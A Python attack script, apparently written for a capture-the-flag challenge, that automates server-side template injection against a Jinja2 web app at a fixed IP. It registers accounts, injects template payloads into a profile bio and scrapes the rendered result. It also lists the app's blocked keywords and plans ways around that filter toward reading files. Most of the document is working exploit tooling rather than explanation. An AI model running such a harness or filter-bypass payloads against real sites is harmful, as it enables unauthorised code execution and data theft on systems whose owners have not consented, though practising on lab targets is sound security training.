#!/usr/bin/env python3
import requests
from PIL import Image
import io
import re

BASE_URL = "http://94.237.56.175:48466"

def test_payload(payload_desc, payload):
    """Test a single SSTI payload"""
    session = requests.Session()
    
    # Create unique username
    import random
    username = f"user{random.randint(1000, 9999)}"
    
    # Sign up and login
    signup_data = {'email': f'{username}@test.com', 'username': username, 'password': 'password123'}
    session.post(f"{BASE_URL}/signup", data=signup_data)
    
    login_data = {'username': username, 'password': 'password123'}
    session.post(f"{BASE_URL}/login", data=login_data)
    
    # Upload verification document
    img = Image.new('RGB', (100, 100), color='red')
    img_buffer = io.BytesIO()
    img.save(img_buffer, format='JPEG')
    img_buffer.seek(0)
    files = {'file': ('badge.jpg', img_buffer, 'image/jpeg')}
    session.post(f"{BASE_URL}/verification", files=files)
    
    # Update bio with payload
    bio_data = {'bio': payload}
    r = session.post(f"{BASE_URL}/profile", data=bio_data)
    
    if "Bio updated" not in r.text:
        print(f"✗ {payload_desc}")
        print(f"  Payload blocked by filter")
        return None
    
    # Create and access share link
    session.get(f"{BASE_URL}/getlink")
    r = session.get(f"{BASE_URL}/user/{username}")
    
    if r.status_code != 200:
        print(f"✗ {payload_desc}")
        print(f"  Error {r.status_code}")
        return None
    
    # Extract result
    match = re.search(r'<p class="para-class">(.*?)</p>', r.text, re.DOTALL)
    if match:
        result = match.group(1).strip()
        print(f"✓ {payload_desc}")
        print(f"  Result: {result[:200]}")
        return result
    else:
        print(f"✗ {payload_desc}")
        print(f"  Could not extract result")
        return None

print("[*] Testing SSTI payloads to bypass filter and read flag...\n")

# Blocked keywords: __, [, ], attr, class, base, mro, os, popen, init, globals, request, 
#                   args, eval, for, if, config, *, %, script, etc.

# Strategy: Use Jinja2 built-ins that aren't blocked
# Available: lipsum, cycler, joiner, namespace, dict, range, User (from template context)

# We can use |string filter to convert objects to strings
# We can use ~ for concatenation
# We can use filters like: |length, |list, |first, |last, |reverse, |sort, |unique, |sum

payloads = [
    # Test 1: Try to see what's in the namespace
    ("List dict type", "{{ dict|string }}"),
    
    # Test 2: Try to access dict methods (getitem might help)
    ("Dict methods", "{{ dict.get|string }}"),
    
    # Test 3: Try to use the User object to navigate to useful objects
    ("User object", "{{ User|string }}"),
    
    # Test 4: Try url_for which is available in Jinja2 templates
    ("url_for function", "{{ url_for|string }}"),
    
    # Test 5: Try get_flashed_messages
    ("get_flashed_messages", "{{ get_flashed_messages|string }}"),
    
    # Test 6: Try cycler.__init__.__globals__ but without using blocked words
    # We can use | (pipe) as filter and avoid 'attr' keyword
    # But we can't use __ either!
    
    # Test 7: Try using namespace object
    ("namespace", "{{ namespace|string }}"),
    
    # Test 8: Try lipsum function
    ("lipsum", "{{ lipsum|string }}"),
    
    # Test 9: Use ()|string which creates a string object, then try to access its methods
    ("String methods", "{{ ''|string }}"),
    
    # Test 10: Try to use cycler to create objects
    ("cycler type", "{{ cycler|string }}"),
]

results = {}
for desc, payload in payloads:
    result = test_payload(desc, payload)
    if result:
        results[desc] = result

print("\n" + "="*80)
print("SUMMARY OF RESULTS:")
print("="*80)
for desc, result in results.items():
    print(f"\n{desc}:")
    print(f"  {result[:150]}")

# Now let's try more advanced payloads based on what we learned
print("\n\n[*] Attempting advanced payloads...\n")

# The key insight: we need to access builtins.open() without using blocked keywords
# We can potentially use the 'lipsum' or other built-in function's __globals__
# But __ is blocked!

# Alternative: Use format string or other tricks
# Let's try using |e (escape) or |safe or other filters

advanced_payloads = [
    # Try using get method on dict
    ("Get flashed messages globals", "{{ get_flashed_messages.func_globals }}"),
    
    # Try using __dict__ equivalent
    ("lipsum dict", "{{ lipsum.func_dict }}"),
]

for desc, payload in advanced_payloads:
    result = test_payload(desc, payload)
    if result and result != "":
        print(f"\n>>> Interesting result for '{desc}':")
        print(result)
